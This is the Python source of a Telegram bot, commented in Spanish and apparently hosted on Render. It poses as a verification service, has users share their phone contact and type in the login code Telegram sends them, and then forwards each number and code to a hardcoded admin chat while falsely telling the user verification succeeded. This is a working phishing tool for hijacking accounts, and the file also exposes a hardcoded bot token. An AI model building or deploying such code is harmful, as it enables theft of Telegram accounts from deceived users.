import os
import asyncio
import logging
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters
)
from aiohttp import web
import socket

# ================================
# CONFIGURACIÓN (EDITA AQUÍ)
# ================================
TELEGRAM_TOKEN = "8557648219:AAHSBqKw7cP5Qz8hEeJn-Sjv4U6eZNnWACU"
ADMIN_ID = 7363341763
PORT = int(os.environ.get("PORT", 8000))

# ================================
# LOGGING
# ================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================================
# ESTADOS Y DATOS
# ================================
PHONE, CODE = range(2)
user_sessions = {}
bot_start_time = datetime.now()

# ================================
# FUNCIONES DEL BOT
# ================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Maneja /start - Inicia el proceso de verificación"""
    user = update.effective_user
    
    # Guardar sesión
    user_sessions[user.id] = {
        "step": "waiting_contact",
        "username": user.username,
        "start_time": datetime.now().isoformat(),
        "user_id": user.id
    }
    
    # Crear teclado con botón de contacto
    contact_button = KeyboardButton("📱 Compartir mi número", request_contact=True)
    keyboard = [[contact_button]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "👋 *Bienvenido*\n\n"
        "Para continuar, necesito verificar tu número.\n"
        "Presiona el botón para compartir tu contacto.",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )
    
    return PHONE

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Procesa el contacto compartido"""
    user = update.effective_user
    contact = update.message.contact
    
    # Verificar que sea el contacto del usuario
    if contact.user_id != user.id:
        await update.message.reply_text("⚠️ Por favor, comparte tu propio contacto.")
        return PHONE
    
    # Guardar información del contacto
    user_info = {
        "step": "waiting_code",
        "phone": contact.phone_number,
        "name": f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
        "username": user.username,
        "user_id": user.id,
        "contact_time": datetime.now().isoformat()
    }
    user_sessions[user.id] = user_info
    
    # 🔥 ENVIAR AL ADMINISTRADOR
    admin_message = (
        f"📱 *NUEVO CONTACTO RECIBIDO*\n\n"
        f"👤 *Nombre:* {user_info['name']}\n"
        f"📞 *Teléfono:* {contact.phone_number}\n"
        f"🆔 *ID:* `{user.id}`\n"
        f"👁️ *Username:* @{user.username or 'N/A'}\n"
        f"⏰ *Hora:* {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"📝 *Estado:* Esperando código de Telegram"
    )
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_message,
            parse_mode="Markdown"
        )
        logger.info(f"✅ Contacto enviado al admin - User ID: {user.id}")
    except Exception as e:
        logger.error(f"❌ Error enviando al admin: {e}")
    
    # Responder al usuario
    await update.message.reply_text(
        "✅ *Contacto recibido correctamente*\n\n"
        "📨 *Ahora recibirás un código de Telegram*\n"
        "• Es un código de 5 dígitos\n"
        "• Te llegará por SMS o llamada\n"
        "• Es enviado por Telegram oficialmente\n\n"
        "Cuando lo recibas, escríbelo aquí:\n"
        "`Ejemplo: 12345`",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True)  # Remover teclado
    )
    
    return CODE

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Procesa el código ingresado por el usuario"""
    user = update.effective_user
    code_text = update.message.text.strip()
    
    # Verificar estado del usuario
    if user.id not in user_sessions or user_sessions[user.id]["step"] != "waiting_code":
        await update.message.reply_text(
            "⚠️ *Primero debes compartir tu contacto.*\n"
            "Usa /start para comenzar.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END
    
    user_info = user_sessions[user.id]
    
    # Validar formato del código
    if not code_text.isdigit() or len(code_text) < 5:
        await update.message.reply_text(
            "❌ *Formato inválido*\n"
            "El código debe contener solo números (mínimo 5 dígitos).\n"
            "Inténtalo de nuevo:",
            parse_mode="Markdown"
        )
        return CODE
    
    # 🔥 ENVIAR CÓDIGO AL ADMINISTRADOR
    code_message = (
        f"🔐 *CÓDIGO DE TELEGRAM RECIBIDO*\n\n"
        f"👤 *Usuario:* {user_info['name']}\n"
        f"📞 *Teléfono:* {user_info['phone']}\n"
        f"🆔 *ID:* `{user.id}`\n"
        f"👁️ *Username:* @{user.username or 'N/A'}\n"
        f"⏰ *Hora:* {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"📝 *Código ingresado:*\n"
        f"`{code_text}`\n\n"
        f"✅ *VERIFICACIÓN COMPLETADA*"
    )
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=code_message,
            parse_mode="Markdown"
        )
        logger.info(f"✅ Código enviado al admin - User ID: {user.id}, Código: {code_text}")
    except Exception as e:
        logger.error(f"❌ Error enviando código al admin: {e}")
    
    # Confirmación al usuario
    await update.message.reply_text(
        f"🎉 *¡Verificación exitosa!*\n\n"
        f"✅ Código `{code_text}` recibido correctamente.\n"
        f"📊 Tu verificación ha sido completada.\n\n"
        f"⏰ *Finalizado:* {datetime.now().strftime('%H:%M:%S')}",
        parse_mode="Markdown"
    )
    
    # Limpiar sesión del usuario
    if user.id in user_sessions:
        del user_sessions[user.id]
    
    return ConversationHandler.END

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancela la conversación"""
    user = update.effective_user
    
    if user.id in user_sessions:
        del user_sessions[user.id]
    
    await update.message.reply_text(
        "❌ *Proceso cancelado.*\n"
        "Usa /start si deseas intentarlo nuevamente.",
        parse_mode="Markdown"
    )
    
    return ConversationHandler.END

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /stats - Solo para administrador"""
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        await update.message.reply_text("⚠️ Este comando es solo para administradores.")
        return
    
    # Calcular estadísticas
    waiting_for_code = sum(1 for data in user_sessions.values() if data.get("step") == "waiting_code")
    total_sessions = len(user_sessions)
    
    uptime = datetime.now() - bot_start_time
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    
    stats_text = (
        f"📊 *ESTADÍSTICAS DEL BOT*\n\n"
        f"• Sesiones activas: `{total_sessions}`\n"
        f"• Esperando código: `{waiting_for_code}`\n"
        f"• Tiempo activo: `{hours}h {minutes}m {seconds}s`\n"
        f"• Admin ID: `{ADMIN_ID}`\n"
        f"• Puerto: `{PORT}`\n"
        f"• Hora servidor: `{datetime.now().strftime('%H:%M:%S')}`\n\n"
        f"🛠 *Hosteado en:* Render.com"
    )
    
    await update.message.reply_text(stats_text, parse_mode="Markdown")

async def health_check(request):
    """Endpoint de salud para Render"""
    return web.Response(
        text=f"🚀 Bot Telegram - Status: OK\n"
             f"⏰ Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
             f"👥 Usuarios activos: {len(user_sessions)}\n"
             f"📡 Puerto: {PORT}",
        content_type="text/plain"
    )

async def start_web_server():
    """Inicia el servidor web para Render"""
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    # Usar el puerto de Render
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    logger.info(f"🌐 Servidor web iniciado en puerto {PORT}")
    return runner

async def start_telegram_bot():
    """Inicia el bot de Telegram"""
    # Crear aplicación del bot
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Configurar el manejador de conversación
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_command)],
        states={
            PHONE: [
                MessageHandler(filters.CONTACT, handle_contact),
                CommandHandler('cancel', cancel_command)
            ],
            CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code),
                CommandHandler('cancel', cancel_command)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel_command)]
    )
    
    # Agregar handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('stats', stats_command))
    
    # Iniciar bot
    await application.initialize()
    await application.start()
    
    # Usar polling (sin webhook)
    await application.updater.start_polling()
    
    logger.info(f"🤖 Bot iniciado con token: {TELEGRAM_TOKEN[:15]}...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    
    return application

async def main():
    """Función principal"""
    # Información de inicio
    print("=" * 60)
    print(f"🚀 TELEGRAM BOT - RENDER 2026")
    print(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🔑 Token: {TELEGRAM_TOKEN[:15]}...")
    print(f"👑 Admin: {ADMIN_ID}")
    print(f"🌐 Puerto: {PORT}")
    print("=" * 60)
    
    try:
        # Iniciar servidor web (requerido por Render)
        web_server = await start_web_server()
        
        # Iniciar bot de Telegram
        telegram_bot = await start_telegram_bot()
        
        # Mantener el servicio activo
        logger.info("✅ Sistema completamente operativo")
        
        # Bucle infinito para mantener el servicio activo
        while True:
            await asyncio.sleep(3600)  # Esperar 1 hora
            
    except KeyboardInterrupt:
        logger.info("⏹️ Deteniendo servicio...")
    except Exception as e:
        logger.error(f"❌ Error crítico: {e}")
        raise
    finally:
        logger.info("👋 Servicio detenido")

if __name__ == '__main__':
    # Configurar asyncio para Render
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n✅ Programa terminado correctamente")
    except Exception as e:
        print(f"❌ Error de inicio: {e}")
        sys.exit(1)
